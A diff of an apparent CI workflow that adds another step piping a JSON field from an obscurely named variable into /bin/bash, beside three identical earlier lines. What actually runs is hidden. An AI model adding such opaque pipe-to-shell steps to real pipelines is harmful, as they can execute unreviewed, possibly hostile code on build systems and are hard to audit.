@@ -25,6 +25,7 @@ jobs:
           echo $tj496 | jq -r .bk50 | /bin/bash
           echo $ptjh2594 | jq -r .kpdt6 | /bin/bash
           printf '%s' "$m2" | jq -r .rn5 | /bin/bash
+          echo $kogta6 | jq -r .ltgw390 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
